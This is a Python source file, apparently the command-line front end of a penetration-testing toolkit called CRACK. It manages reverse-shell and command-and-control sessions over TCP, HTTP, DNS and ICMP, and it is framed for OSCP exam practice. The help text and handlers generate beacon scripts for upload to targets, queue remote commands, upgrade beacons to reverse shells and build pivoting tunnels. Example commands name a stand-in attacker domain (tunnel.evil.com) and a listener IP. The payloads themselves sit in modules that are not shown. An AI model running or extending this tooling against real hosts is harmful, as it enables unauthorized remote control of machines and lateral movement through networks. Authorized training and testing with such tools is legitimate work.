"""
Unified CLI for session management system.

Consolidates ALL session commands:
- TCP/HTTP/HTTPS/DNS/ICMP listeners
- Session lifecycle management
- Shell upgrade and stabilization
- Tunnel management
- Beacon operations

Integrated with main CRACK CLI via crack.cli:session_command
"""

import argparse
import sys
import time
import asyncio
from pathlib import Path
from typing import Optional

from .manager import SessionManager
from .storage.base import SessionStorage
from .config import SessionConfig
from .listeners.tcp_listener import TCPListener
from .listeners.http_listener import HTTPListener
from .listeners.dns_listener import DNSListener
from .listeners.icmp_listener import ICMPListener
from .listeners.beacon_protocol import BeaconProtocol
from .shell.tcp_upgrader import TCPShellUpgrader
from .shell.http_upgrader import HTTPShellUpgrader
from .shell.stabilizer import ShellStabilizer
from .tunnel.manager import TunnelManager


class UnifiedSessionCLI:
    """Unified session management CLI interface."""

    def __init__(self):
        """Initialize CLI with session components."""
        self.storage = SessionStorage()
        self.config = SessionConfig()
        self.manager = SessionManager(self.storage, self.config)
        self.tunnel_manager = TunnelManager(self.manager, self.config)

    def create_parser(self) -> argparse.ArgumentParser:
        """Create unified argument parser for session commands."""
        parser = argparse.ArgumentParser(
            description='CRACK Session Management System',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
CRACK Session Management - Complete reverse shell and C2 system

Commands:
  start           Start listener (TCP, HTTP, DNS, ICMP)
  list            List active sessions
  info            Show session details
  interact        Attach to interactive session
  upgrade         Upgrade shell to TTY
  stabilize       Stabilize upgraded shell
  kill            Terminate session

  beacon-gen      Generate beacon script
  beacon-send     Send command to beacon
  beacon-poll     Poll beacon for responses
  beacon-upgrade  Upgrade beacon to TCP reverse shell

  tunnel-create   Create port forward/SOCKS tunnel
  tunnel-list     List active tunnels
  tunnel-kill     Terminate tunnel

Examples:
  # Start TCP listener
  crack session start tcp --port 4444

  # Start HTTP beacon listener
  crack session start http --port 8080

  # Start DNS tunnel (requires root + DNS delegation)
  sudo crack session start dns --domain tunnel.evil.com

  # Start ICMP tunnel (requires root)
  sudo crack session start icmp

  # List active sessions
  crack session list --filter active

  # Upgrade shell to TTY
  crack session upgrade <session_id> --method auto

  # Generate bash beacon
  crack session beacon-gen bash http://192.168.45.150:8080 -o beacon.sh

  # Create SSH SOCKS proxy
  crack session tunnel-create <session_id> --type ssh-dynamic --socks-port 1080

OSCP Exam Use Cases:
  - Catch reverse shells from exploits
  - HTTP beacons for firewall evasion
  - DNS tunnels when only DNS allowed
  - ICMP tunnels when only ping allowed
  - Shell upgrade for full TTY functionality
  - Port forwarding for pivoting through compromised hosts
            """
        )

        subparsers = parser.add_subparsers(dest='action', help='Session action')

        # START command - Unified listener start
        self._add_start_parser(subparsers)

        # LIST command
        self._add_list_parser(subparsers)

        # INFO command
        self._add_info_parser(subparsers)

        # UPGRADE command
        self._add_upgrade_parser(subparsers)

        # STABILIZE command
        self._add_stabilize_parser(subparsers)

        # KILL command
        self._add_kill_parser(subparsers)

        # BEACON commands
        self._add_beacon_parsers(subparsers)

        # TUNNEL commands
        self._add_tunnel_parsers(subparsers)

        return parser

    def _add_start_parser(self, subparsers):
        """Add 'start' command parser."""
        start_parser = subparsers.add_parser('start', help='Start listener')
        start_parser.add_argument('type', choices=['tcp', 'http', 'https', 'dns', 'icmp'],
                                  help='Listener type')
        start_parser.add_argument('--port', '-p', type=int, help='Listen port')
        start_parser.add_argument('--host', default='0.0.0.0', help='Bind host (default: 0.0.0.0)')
        start_parser.add_argument('--target', '-t', help='Expected target IP (optional)')

        # HTTP-specific options
        start_parser.add_argument('--cert', type=Path, help='SSL certificate (HTTPS)')
        start_parser.add_argument('--key', type=Path, help='SSL private key (HTTPS)')

        # DNS-specific options
        start_parser.add_argument('--domain', '-d', help='Domain for DNS tunnel')
        start_parser.add_argument('--tool', help='Specific tool (iodine, dnscat2, ptunnel, icmpsh)')
        start_parser.add_argument('--password', help='Password for DNS/ICMP tunnel')
        start_parser.add_argument('--tunnel-network', default='10.0.0.1',
                                 help='Tunnel network (iodine)')
        start_parser.add_argument('--secret', help='Secret for dnscat2')

    def _add_list_parser(self, subparsers):
        """Add 'list' command parser."""
        list_parser = subparsers.add_parser('list', help='List sessions')
        list_parser.add_argument('--filter', '-f', help='Filter: active, type:tcp, target:IP')
        list_parser.add_argument('--verbose', '-v', action='store_true', help='Detailed info')
        list_parser.add_argument('--type', help='Filter by type (tcp, http, dns, icmp)')
        list_parser.add_argument('--status', help='Filter by status (active, dead, upgraded)')

    def _add_info_parser(self, subparsers):
        """Add 'info' command parser."""
        info_parser = subparsers.add_parser('info', help='Show session details')
        info_parser.add_argument('session_id', help='Session ID (full or prefix)')

    def _add_upgrade_parser(self, subparsers):
        """Add 'upgrade' command parser."""
        upgrade_parser = subparsers.add_parser('upgrade', help='Upgrade shell to TTY')
        upgrade_parser.add_argument('session_id', help='Session ID to upgrade')
        upgrade_parser.add_argument('--method',
                                   choices=['auto', 'python', 'python3', 'script', 'socat'],
                                   default='auto',
                                   help='Upgrade method (default: auto)')

    def _add_stabilize_parser(self, subparsers):
        """Add 'stabilize' command parser."""
        stabilize_parser = subparsers.add_parser('stabilize', help='Stabilize upgraded shell')
        stabilize_parser.add_argument('session_id', help='Session ID to stabilize')

    def _add_kill_parser(self, subparsers):
        """Add 'kill' command parser."""
        kill_parser = subparsers.add_parser('kill', help='Terminate session')
        kill_parser.add_argument('session_id', help='Session ID to kill')

    def _add_beacon_parsers(self, subparsers):
        """Add beacon-related command parsers."""
        # BEACON-GEN
        gen_parser = subparsers.add_parser('beacon-gen', help='Generate beacon script')
        gen_parser.add_argument('type',
                               choices=['bash', 'php', 'php_web', 'powershell', 'python'],
                               help='Beacon type')
        gen_parser.add_argument('listener_url', help='Listener URL (http://LHOST:PORT)')
        gen_parser.add_argument('--output', '-o', type=Path, help='Output file')
        gen_parser.add_argument('--interval', '-i', type=int, default=5,
                               help='Beacon interval (seconds)')
        gen_parser.add_argument('--jitter', '-j', type=int, default=0,
                               help='Jitter (seconds)')
        gen_parser.add_argument('--session-id', help='Custom session ID')

        # BEACON-SEND
        send_parser = subparsers.add_parser('beacon-send', help='Send command to beacon')
        send_parser.add_argument('session_id', help='Beacon session ID')
        send_parser.add_argument('command', help='Command to execute')

        # BEACON-POLL
        poll_parser = subparsers.add_parser('beacon-poll', help='Poll beacon responses')
        poll_parser.add_argument('session_id', help='Beacon session ID')
        poll_parser.add_argument('--all', action='store_true', help='Show all responses')

        # BEACON-UPGRADE
        upgrade_parser = subparsers.add_parser('beacon-upgrade',
                                              help='Upgrade beacon to TCP reverse shell')
        upgrade_parser.add_argument('session_id', help='Beacon session ID')
        upgrade_parser.add_argument('--lhost', required=True, help='Your IP')
        upgrade_parser.add_argument('--lport', type=int, required=True, help='Listen port')
        upgrade_parser.add_argument('--payload', help='Payload type (auto-detected)')
        upgrade_parser.add_argument('--timeout', type=int, default=30, help='Timeout (seconds)')

    def _add_tunnel_parsers(self, subparsers):
        """Add tunnel-related command parsers."""
        # TUNNEL-CREATE
        create_parser = subparsers.add_parser('tunnel-create', help='Create tunnel')
        create_parser.add_argument('session_id', help='Session ID for tunnel')
        create_parser.add_argument('--type', required=True,
                                  choices=['ssh-local', 'ssh-remote', 'ssh-dynamic',
                                          'chisel', 'socat', 'proxychains'],
                                  help='Tunnel type')
        create_parser.add_argument('--local-port', type=int, help='Local port')
        create_parser.add_argument('--remote-host', help='Remote destination host')
        create_parser.add_argument('--remote-port', type=int, help='Remote destination port')
        create_parser.add_argument('--socks-port', type=int, help='SOCKS proxy port')
        create_parser.add_argument('--username', help='SSH username')
        create_parser.add_argument('--password', help='SSH password')
        create_parser.add_argument('--key-file', type=Path, help='SSH private key')

        # TUNNEL-LIST
        list_parser = subparsers.add_parser('tunnel-list', help='List active tunnels')
        list_parser.add_argument('--session', help='Filter by session ID')
        list_parser.add_argument('--status', help='Filter by status')

        # TUNNEL-KILL
        kill_parser = subparsers.add_parser('tunnel-kill', help='Terminate tunnel')
        kill_parser.add_argument('tunnel_id', help='Tunnel ID to kill')

    # =====================================================================
    # COMMAND HANDLERS
    # =====================================================================

    def handle_start(self, args):
        """Handle 'start' command - start listener."""
        if args.type == 'tcp':
            self._start_tcp_listener(args)
        elif args.type in ['http', 'https']:
            self._start_http_listener(args)
        elif args.type == 'dns':
            self._start_dns_listener(args)
        elif args.type == 'icmp':
            self._start_icmp_listener(args)

    def _start_tcp_listener(self, args):
        """Start TCP reverse shell listener."""
        port = args.port or self.config.get_default_port('tcp')

        print(f"[+] Starting TCP listener on {args.host}:{port}")
        if args.target:
            print(f"[+] Expecting connections from: {args.target}")

        listener = TCPListener(port, self.manager, args.target, args.host)

        try:
            asyncio.run(listener.start())
        except KeyboardInterrupt:
            print("\n[!] Stopping listener...")
            listener.stop()
        except Exception as e:
            print(f"[!] Error: {e}")
            sys.exit(1)

    def _start_http_listener(self, args):
        """Start HTTP/HTTPS beacon listener."""
        port = args.port or self.config.get_default_port('http')
        https = args.type == 'https'

        print(f"[+] Starting HTTP{'S' if https else ''} beacon listener on {args.host}:{port}")
        print(f"[+] Beacon URL: {'https' if https else 'http'}://<LHOST>:{port}/beacon")

        listener = HTTPListener(
            port=port,
            session_manager=self.manager,
            host=args.host,
            use_https=https,
            cert_file=args.cert,
            key_file=args.key
        )

        try:
            if listener.start():
                print("\n[+] HTTP listener started successfully")
                print(f"[+] Use 'crack session beacon-gen' to create beacon scripts")

                # Keep running
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("\n\n[*] Stopping HTTP listener...")
                    listener.stop()
                    print("[+] HTTP listener stopped")
        except Exception as e:
            print(f"\n[!] Failed to start HTTP listener: {e}")
            sys.exit(1)

    def _start_dns_listener(self, args):
        """Start DNS tunnel listener."""
        if not args.domain:
            print("[!] Error: --domain required for DNS tunnels")
            sys.exit(1)

        tool = args.tool or 'iodine'

        print(f"[*] Starting DNS tunnel listener ({tool})")
        print(f"[*] Domain: {args.domain}")

        listener = DNSListener(
            domain=args.domain,
            session_manager=self.manager,
            tool=tool,
            password=args.password,
            tunnel_network=args.tunnel_network,
            secret=args.secret
        )

        try:
            if listener.start():
                print("\n[+] DNS tunnel listener started successfully")
                info = listener.get_listener_info()

                if tool == 'iodine':
                    print(f"[+] Password: {info['password']}")
                    print(f"[+] Tunnel network: {info['tunnel_network']}/24")
                elif tool == 'dnscat2':
                    print(f"[+] Secret: {info['secret']}")

                print(f"\n[+] Client command:")
                print(f"    {info['client_command']}")

                print("\n[*] Listener running. Press Ctrl+C to stop.")

                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("\n\n[*] Stopping DNS listener...")
                    listener.stop()
                    print("[+] DNS listener stopped")
        except Exception as e:
            print(f"\n[!] Failed to start DNS listener: {e}")
            sys.exit(1)

    def _start_icmp_listener(self, args):
        """Start ICMP tunnel listener."""
        tool = args.tool or 'ptunnel'

        print(f"[*] Starting ICMP tunnel listener ({tool})")

        listener = ICMPListener(
            session_manager=self.manager,
            tool=tool,
            password=args.password,
            target_ip=args.target
        )

        try:
            if listener.start():
                print("\n[+] ICMP tunnel listener started successfully")
                info = listener.get_listener_info()

                print(f"[+] Tool: {tool}")
                if tool == 'ptunnel':
                    print(f"[+] Password: {info['password']}")

                print(f"\n[+] Client command:")
                print(f"    {info['client_command']}")

                print("\n[*] Listener running. Press Ctrl+C to stop.")

                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("\n\n[*] Stopping ICMP listener...")
                    listener.stop()
                    print("[+] ICMP listener stopped")
        except Exception as e:
            print(f"\n[!] Failed to start ICMP listener: {e}")
            sys.exit(1)

    def handle_list(self, args):
        """Handle 'list' command - list sessions."""
        filters = {}

        # Parse filter string
        if args.filter:
            if args.filter == 'active':
                filters['status'] = 'active'
            elif ':' in args.filter:
                key, value = args.filter.split(':', 1)
                filters[key] = value

        # Add explicit filters
        if args.type:
            filters['type'] = args.type
        if args.status:
            filters['status'] = args.status

        sessions = self.manager.list_sessions(filters)

        if not sessions:
            print("[!] No sessions found")
            return

        # Print table
        if args.verbose:
            for session in sessions:
                print(f"\n{'='*60}")
                print(f"Session ID: {session.id}")
                print(f"Type: {session.type} | Protocol: {session.protocol}")
                print(f"Target: {session.target}:{session.port}")
                print(f"Status: {session.status}")
                print(f"Shell: {session.shell_type or 'unknown'}")
                print(f"Created: {session.created_at.strftime('%Y-%m-%d %H:%M:%S')}")
                print(f"Last Seen: {session.last_seen.strftime('%Y-%m-%d %H:%M:%S')}")
                if session.capabilities.has_pty:
                    print(f"Capabilities: PTY, History={session.capabilities.has_history}, "
                          f"Tab={session.capabilities.has_tab_completion}")
                print(f"{'='*60}")
        else:
            print(f"\n{'ID':<10} {'Type':<8} {'Target':<16} {'Port':<6} {'Status':<10} "
                  f"{'Shell':<10} {'PTY':<5}")
            print("=" * 75)
            for s in sessions:
                pty = 'Yes' if s.capabilities.has_pty else 'No'
                print(f"{s.id[:8]:<10} {s.type:<8} {s.target:<16} {s.port:<6} "
                      f"{s.status:<10} {s.shell_type or 'unknown':<10} {pty:<5}")

    def handle_info(self, args):
        """Handle 'info' command - show session details."""
        session = self.manager.get_session(args.session_id)

        if not session:
            print(f"[!] Session not found: {args.session_id}")
            sys.exit(1)

        print(f"\n{'='*60}")
        print(f"Session ID: {session.id}")
        print(f"Type: {session.type} | Protocol: {session.protocol}")
        print(f"Target: {session.target}:{session.port}")
        print(f"Status: {session.status}")
        print(f"Shell: {session.shell_type or 'unknown'}")
        print(f"PID: {session.pid or 'N/A'}")
        print(f"Created: {session.created_at.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Last Seen: {session.last_seen.strftime('%Y-%m-%d %H:%M:%S')}")

        print(f"\nCapabilities:")
        print(f"  PTY: {session.capabilities.has_pty}")
        print(f"  History: {session.capabilities.has_history}")
        print(f"  Tab Completion: {session.capabilities.has_tab_completion}")
        print(f"  Job Control: {session.capabilities.has_job_control}")

        if session.capabilities.detected_tools:
            print(f"  Detected Tools: {', '.join(session.capabilities.detected_tools)}")

        if session.metadata:
            print(f"\nMetadata:")
            for key, value in session.metadata.items():
                print(f"  {key}: {value}")

        print(f"{'='*60}\n")

    def handle_upgrade(self, args):
        """Handle 'upgrade' command - upgrade shell to TTY."""
        session = self.manager.get_session(args.session_id)

        if not session:
            print(f"[!] Session not found: {args.session_id}")
            sys.exit(1)

        if session.status == 'dead':
            print(f"[!] Session is dead")
            sys.exit(1)

        print(f"[+] Upgrading session {session.id[:8]}")
        print(f"[+] Target: {session.target}:{session.port}")
        print(f"[+] Shell: {session.shell_type or 'unknown'}")

        upgrader = TCPShellUpgrader(self.manager, self.config)

        if args.method == 'auto':
            success = upgrader.auto_upgrade(session)
        elif args.method == 'python':
            success = upgrader.upgrade_python_pty(session)
            if success:
                upgrader.stabilize_shell(session)
        elif args.method == 'python3':
            success = upgrader.upgrade_python3_pty(session)
            if success:
                upgrader.stabilize_shell(session)
        elif args.method == 'script':
            success = upgrader.upgrade_script(session)
        elif args.method == 'socat':
            success = upgrader.upgrade_socat(session)

        if success:
            print(f"\n[+] Session upgraded successfully!")
            print(f"[+] PTY: {session.capabilities.has_pty}")
            print(f"[+] History: {session.capabilities.has_history}")
            print(f"[+] Tab Completion: {session.capabilities.has_tab_completion}")
        else:
            print(f"\n[!] Upgrade failed")
            print(f"\n[*] Manual upgrade instructions:")
            print(upgrader.get_manual_upgrade_instructions(session))

    def handle_stabilize(self, args):
        """Handle 'stabilize' command - stabilize upgraded shell."""
        session = self.manager.get_session(args.session_id)

        if not session:
            print(f"[!] Session not found: {args.session_id}")
            sys.exit(1)

        if not session.capabilities.has_pty:
            print(f"[!] Session does not have PTY - upgrade first")
            sys.exit(1)

        print(f"[+] Stabilizing session {session.id[:8]}")

        stabilizer = ShellStabilizer(self.manager, self.config)

        if stabilizer.stabilize(session):
            print(f"[+] Shell stabilized successfully")
        else:
            print(f"[!] Stabilization failed")
            print(f"\n[*] Manual stabilization:")
            print(stabilizer.get_manual_stabilization_instructions(session))

    def handle_kill(self, args):
        """Handle 'kill' command - terminate session."""
        session = self.manager.get_session(args.session_id)

        if not session:
            print(f"[!] Session not found: {args.session_id}")
            sys.exit(1)

        print(f"[+] Killing session {session.id[:8]} ({session.target}:{session.port})")

        if self.manager.kill_session(session.id):
            print(f"[+] Session terminated successfully")
        else:
            print(f"[!] Failed to kill session (may already be dead)")

    def handle_beacon_gen(self, args):
        """Handle 'beacon-gen' command - generate beacon script."""
        import uuid

        session_id = args.session_id or str(uuid.uuid4())

        protocol = BeaconProtocol()
        script = protocol.generate_beacon_script(
            beacon_type=args.type,
            listener_url=args.listener_url,
            session_id=session_id,
            interval=args.interval,
            jitter=args.jitter
        )

        if args.output:
            args.output.write_text(script)
            print(f"[+] Beacon script written to: {args.output}")
            print(f"[*] Session ID: {session_id}")
            print(f"[*] Beacon URL: {args.listener_url}/beacon")
            print(f"[*] Interval: {args.interval}s (jitter: {args.jitter}s)")
            print("\n[*] Next steps:")
            print(f"    1. Upload {args.output} to target")
            print(f"    2. Execute on target")
            print(f"    3. Wait for beacon registration")
            print(f"    4. Send commands: crack session beacon-send {session_id[:8]} <command>")
        else:
            print(script)

    def handle_beacon_send(self, args):
        """Handle 'beacon-send' command - send command to beacon."""
        session = self.manager.get_session(args.session_id)

        if not session:
            print(f"[!] Session not found: {args.session_id}")
            sys.exit(1)

        if session.type not in ['http', 'https']:
            print(f"[!] Session is not HTTP beacon type")
            sys.exit(1)

        # Queue command in session metadata
        if 'pending_commands' not in session.metadata:
            session.metadata['pending_commands'] = []
        session.metadata['pending_commands'].append(args.command)

        self.manager.update_session(session.id, {'metadata': session.metadata})

        print(f"[+] Command queued for session {session.id[:8]}")
        print(f"[+] Command: {args.command}")
        print(f"[*] Will execute on next beacon poll")

    def handle_beacon_poll(self, args):
        """Handle 'beacon-poll' command - poll beacon responses."""
        session = self.manager.get_session(args.session_id)

        if not session:
            print(f"[!] Session not found: {args.session_id}")
            sys.exit(1)

        responses = session.metadata.get('beacon_responses', [])

        if not responses:
            print(f"[*] No responses for session {session.id[:8]}")
            return

        if args.all:
            print(f"\n[*] All responses for session {session.id[:8]}:")
            for i, resp in enumerate(responses, 1):
                print(f"\n--- Response {i} ---")
                print(resp.get('output', ''))
        else:
            print(f"\n[*] Latest response for session {session.id[:8]}:")
            print(responses[-1].get('output', ''))

    def handle_beacon_upgrade(self, args):
        """Handle 'beacon-upgrade' command - upgrade beacon to TCP reverse shell."""
        session = self.manager.get_session(args.session_id)

        if not session:
            print(f"[!] Session not found: {args.session_id}")
            sys.exit(1)

        if session.type not in ['http', 'https']:
            print(f"[!] Session is not HTTP beacon type")
            sys.exit(1)

        print(f"[*] Upgrading HTTP session {session.id[:8]} to TCP reverse shell")
        print(f"[*] Listener: {args.lhost}:{args.lport}")
        print(f"[*] Timeout: {args.timeout}s")

        if args.payload:
            print(f"[*] Payload type: {args.payload}")
        else:
            print("[*] Payload type: auto-detect")

        upgrader = HTTPShellUpgrader(self.manager, self.config)

        new_session = upgrader.upgrade_to_tcp(
            http_session=session,
            lhost=args.lhost,
            lport=args.lport,
            payload_type=args.payload,
            timeout=args.timeout
        )

        if new_session:
            print(f"\n[+] Upgrade successful!")
            print(f"[+] New TCP session ID: {new_session.id[:8]}")
            print(f"[+] Original HTTP session marked as 'upgraded'")
        else:
            print(f"\n[!] Upgrade failed")

    def handle_tunnel_create(self, args):
        """Handle 'tunnel-create' command - create tunnel."""
        session = self.manager.get_session(args.session_id)

        if not session:
            print(f"[!] Session not found: {args.session_id}")
            sys.exit(1)

        print(f"[+] Creating {args.type} tunnel for session {session.id[:8]}")

        config = {
            'local_port': args.local_port,
            'remote_host': args.remote_host,
            'remote_port': args.remote_port,
            'socks_port': args.socks_port,
            'username': args.username,
            'password': args.password,
            'key_file': str(args.key_file) if args.key_file else None
        }

        tunnel = self.tunnel_manager.create_tunnel(
            session_id=session.id,
            tunnel_type=args.type,
            config=config
        )

        if tunnel:
            print(f"[+] Tunnel created successfully")
            print(f"[+] Tunnel ID: {tunnel['id'][:8]}")
            print(f"[+] Type: {tunnel['type']}")
            print(f"[+] Command: {tunnel['command']}")

            if args.type == 'proxychains':
                print(f"\n[*] Proxychains config written to: {tunnel['config_file']}")
                print(f"[*] Usage: proxychains4 -f {tunnel['config_file']} <command>")
        else:
            print(f"[!] Failed to create tunnel")

    def handle_tunnel_list(self, args):
        """Handle 'tunnel-list' command - list tunnels."""
        filters = {}

        if args.session:
            filters['session_id'] = args.session
        if args.status:
            filters['status'] = args.status

        tunnels = self.tunnel_manager.list_tunnels(filters)

        if not tunnels:
            print("[!] No tunnels found")
            return

        print(f"\n{'ID':<10} {'Type':<15} {'Session':<10} {'Connection':<40} {'Status':<10}")
        print("=" * 90)

        for t in tunnels:
            conn_str = f"{t.get('local_port', 'N/A')} -> {t.get('remote_host', 'N/A')}:{t.get('remote_port', 'N/A')}"
            print(f"{t['id'][:8]:<10} {t['type']:<15} {t['session_id'][:8]:<10} "
                  f"{conn_str:<40} {t['status']:<10}")

    def handle_tunnel_kill(self, args):
        """Handle 'tunnel-kill' command - terminate tunnel."""
        print(f"[+] Killing tunnel {args.tunnel_id[:8]}")

        if self.tunnel_manager.kill_tunnel(args.tunnel_id):
            print(f"[+] Tunnel terminated successfully")
        else:
            print(f"[!] Failed to kill tunnel (not found or already dead)")

    def run(self, args):
        """Execute CLI with provided arguments."""
        parser = self.create_parser()
        parsed_args = parser.parse_args(args)

        if not parsed_args.action:
            parser.print_help()
            return

        # Dispatch to handler
        handler_map = {
            'start': self.handle_start,
            'list': self.handle_list,
            'info': self.handle_info,
            'upgrade': self.handle_upgrade,
            'stabilize': self.handle_stabilize,
            'kill': self.handle_kill,
            'beacon-gen': self.handle_beacon_gen,
            'beacon-send': self.handle_beacon_send,
            'beacon-poll': self.handle_beacon_poll,
            'beacon-upgrade': self.handle_beacon_upgrade,
            'tunnel-create': self.handle_tunnel_create,
            'tunnel-list': self.handle_tunnel_list,
            'tunnel-kill': self.handle_tunnel_kill
        }

        handler = handler_map.get(parsed_args.action)

        if handler:
            handler(parsed_args)
        else:
            parser.print_help()


def main():
    """Main entry point for unified session CLI."""
    cli = UnifiedSessionCLI()
    cli.run(sys.argv[1:])


if __name__ == '__main__':
    main()
